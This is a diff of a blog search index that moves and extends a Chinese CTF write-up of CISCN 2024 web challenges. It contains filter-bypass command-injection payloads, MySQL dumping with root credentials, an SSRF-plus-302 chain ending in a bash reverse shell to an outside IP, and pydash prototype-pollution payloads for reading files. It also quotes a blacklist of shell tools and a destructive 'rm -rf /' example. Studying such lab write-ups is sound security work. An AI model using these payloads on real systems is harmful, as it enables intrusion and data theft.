@@ -1,92 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Ciscn2024web复现</title>
-    <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
-
-<p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p>
-<p>eg:</p>
-<p>假设有以下用户输入：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure>
-
-<p>使用 <code>escapeshellcmd</code> 转义后：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure>
-
-<p>输出将会是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure>
-
-<p>而且这里过滤了很多东西</p>
-<p>跟着wp复现</p>
-<p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p>
-<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p>
-<p>发现可以直接执行</p>
-<p>那么我们这就可以命令执行</p>
-<p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p>
-<p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p>
-<p>行不通</p>
-<p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p>
-<p>不行 gg 准备跑路</p>
-<p>但是总有大佬能想出来</p>
-<p><strong>substr()</strong> 这个就有点牛逼了</p>
-<p>我们知道</p>
-<p><strong>自动类型转换（Type Juggling）</strong></p>
-<p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p>
-<p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p>
-<p>所以我们这里payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure>
-
-<p>成功执行 </p>
-<p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p>
-<p>爆出库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure>
-
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p>
-<p>还有个更简单的payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>
-
-<p>直接把所有库的所有数据查出来 然后找flag</p>
-<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>提示2：github找一下源码?</p>
-<p>找到源码</p>
-<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
-<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
-<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
-<p>ssrf漏洞</p>
-<p>定位这个函数<strong>dr_catcher_data</strong></p>
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
-<p>试了下输入本地不行</p>
-<p>302跳转</p>
-<p>自己vps上面构建302.php</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=10&amp;level=1</span><br></pre></td></tr></table></figure>
-
-<p>反弹shell</p>
-<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
-<p>卡了？ 试了几次都这样 </p>
-<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
-]]></content>
-      <categories>
-        <category>ciscn</category>
-      </categories>
-      <tags>
-        <tag>复现</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Sanic&#39;s revenge(复现)</title>
     <url>/2024/07/24/Sanic-s-revenge-%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>复现这个之前先要学习下python的原型链污染（未学┭┮﹏┭┮）</p>
@@ -622,6 +536,119 @@ $$O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:10:"1234567890";s:3:"obj";
 ]]></content>
       <categories>
         <category>ctfshow</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Ciscn2024web复现</title>
+    <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">     <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>**<code>ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);</code>**：设置 <code>open_basedir</code> 配置选项，限制 PHP 只能访问 <code>/var/www/html/</code> 目录及其子目录</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p><code>**escapeshellcmd**</code> 是一个 PHP 内置函数，用于转义传递给 shell 的字符串，以防止命令注入攻击。它的主要作用是确保用户输入的字符串在作为 shell 命令的一部分执行时不会被解释为特殊字符或命令。这个函数会在某些有特殊含义的字符前添加反斜杠，从而使这些字符失去特殊含义。</p>
+<p>eg:</p>
+<p>假设有以下用户输入：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = <span class="string">&#x27;cat /etc/passwd; rm -rf /&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>escapeshellcmd</code> 转义后：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$escaped_input</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$escaped_input</span>;</span><br></pre></td></tr></table></figure>
+
+<p>输出将会是：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat\ /etc/passwd\;\ rm\ -rf\ /</span><br></pre></td></tr></table></figure>
+
+<p>而且这里过滤了很多东西</p>
+<p>跟着wp复现</p>
+<p><code>php -r</code> 是 PHP 命令行界面（CLI）的一部分，它允许你直接在命令行中运行 PHP 代码，而无需创建一个文件来包含这些代码。<code>-r</code> 选项用于指定一段将被执行的 PHP 代码</p>
+<p><img src="/imgs/2024%E5%B9%B47%E6%9C%8830%E6%97%A516%E7%82%B959%E5%88%86.png" alt="image-20240730165912695"></p>
+<p>发现可以直接执行</p>
+<p>那么我们这就可以命令执行</p>
+<p>由于绕过的函数有些多，我们可以使用hex2bin()函数进行16进制转字符进行绕过</p>
+<p>但发现直接<strong>php -r eval(hex2bin(73797374656d2827707327293b));</strong></p>
+<p>行不通</p>
+<p>发现hex2bin需要的参数是一个字符串类型的数字，直接两个双引号呢？</p>
+<p>不行 gg 准备跑路</p>
+<p>但是总有大佬能想出来</p>
+<p><strong>substr()</strong> 这个就有点牛逼了</p>
+<p>我们知道</p>
+<p><strong>自动类型转换（Type Juggling）</strong></p>
+<p>PHP 是一种弱类型语言，它支持自动类型转换，称为“类型杂耍”（type juggling）。这意味着 PHP 会在需要时自动将一种数据类型转换为另一种数据类型。这种转换在函数参数传递时特别常见。</p>
+<p>当你传递一个数字给 <code>substr()</code> 的 <code>$string</code> 参数时，PHP 会自动将这个数字转换为字符串。这是因为 <code>substr()</code> 函数的<strong>第一个参数需要一个字符串</strong>，而 PHP 会尝试将传递的任何数据转换为期望的类型。</p>
+<p>所以我们这里payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=php -r eval(hex2bin(substr(Gu0f3n73797374656d28276c73202f27293b,6)));</span><br></pre></td></tr></table></figure>
+
+<p>成功执行 </p>
+<p>查找&#x2F;目录发现没东西 但是 ps 发现有sql进程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;&#x27;`;</span></span><br><span class="line">cmd=php+-r+<span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27603b,<span class="number">6</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B953%E5%88%86.png" alt="image-20240801105235342"></p>
+<p>爆出库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># select * from PHP_CMS.F1ag_Se3Re7;</span><br><span class="line">cmd=php+-r+eval(hex2bin(substr(Gu0f3n6563686f20606d7973716c202d7520726f6f74202d7027726f6f7427202d65202773656c656374202a2066726f6d205048505f434d532e463161675f5365335265373b27603b,6)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A510%E7%82%B955%E5%88%86.png" alt="image_5"></p>
+<p>还有个更简单的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>
+
+<p>直接把所有库的所有数据查出来 然后找flag</p>
+<h2 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h2><p>hint:简单的cms，可以扫扫看？ 提示1： &#x2F;flag.php： </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if($_SERVER[&quot;REMOTE_ADDR&quot;] != &quot;127.0.0.1&quot;)&#123;</span><br><span class="line">   echo &quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;;</span><br><span class="line">   return;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   system($_GET[&#x27;cmd&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提示2：github找一下源码?</p>
+<p>找到源码</p>
+<p><a href="https://github.com/dayrui/xunruicms">https://github.com/dayrui/xunruicms</a></p>
+<p>信息打点 发现这个cms的漏洞公示<a href="https://www.xunruicms.com/bug/">https://www.xunruicms.com/bug/</a></p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B908%E5%88%86.png" alt="image-20240801200813912"></p>
+<p>定位路径xunruicms-master\dayrui\Fcms\Control\Api\Api.php</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B910%E5%88%86.png" alt="image-20240801201003706"></p>
+<p>ssrf漏洞</p>
+<p>定位这个函数<strong>dr_catcher_data</strong></p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B911%E5%88%86.png" alt="image-20240801201134900"></p>
+<p>试了下输入本地不行</p>
+<p>302跳转</p>
+<p>自己vps上面构建302.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://127.0.0.1/flag.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F8.149.246.169%2F2222%200%3E%261%22&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=1&amp;thumb=http://vps:7777/ctf/302.php&amp;size=6666&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B916%E5%88%86.png" alt="image-20240801201517830"></p>
+<p>卡了？ 试了几次都这样 </p>
+<p>gg 跑路 复现失败 ┭┮﹏┭┮</p>
+<h2 id="sanic"><a href="#sanic" class="headerlink" title="sanic"></a>sanic</h2><p>依旧是这位大佬gxngxngxn</p>
+<p>参考</p>
+<p><a href="https://www.cnblogs.com/gxngxngxn/p/18205235">https://www.cnblogs.com/gxngxngxn/p/18205235</a></p>
+<p>进入src路由</p>
+<p>源码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>分析下这段 在&#x2F;login路由处我们需要绕过**user.lower() &#x3D;&#x3D; ‘adm;n’**的限制，由于这里是从session中读取，所以默认是会在分号处截断，直接传肯定是不行的</p>
+<p>利用八进制绕过</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A520%E7%82%B926%E5%88%86.png" alt="image-20240801202640883"></p>
+<p>原理之前DASCTF复现的时候讲过了</p>
+<p>所以直接上操作</p>
+<p>得到admin的session</p>
+<p>进入admin</p>
+<p>直接污染</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;True&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到flag名</p>
+<p><img src="/imgs/2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B908%E5%88%86.png" alt="image-20240801210841152"></p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;.__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/24bcbd0192e591d6ded1_flag&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问src 拿flag</p>
+<p><img src="/%5Cimgs%5C2024%E5%B9%B48%E6%9C%881%E6%97%A521%E7%82%B910%E5%88%86.png" alt="image-20240801211003726"></p>
+<h2 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h2><h2 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h2>]]></content>
+      <categories>
+        <category>ciscn</category>
       </categories>
       <tags>
         <tag>复现</tag>
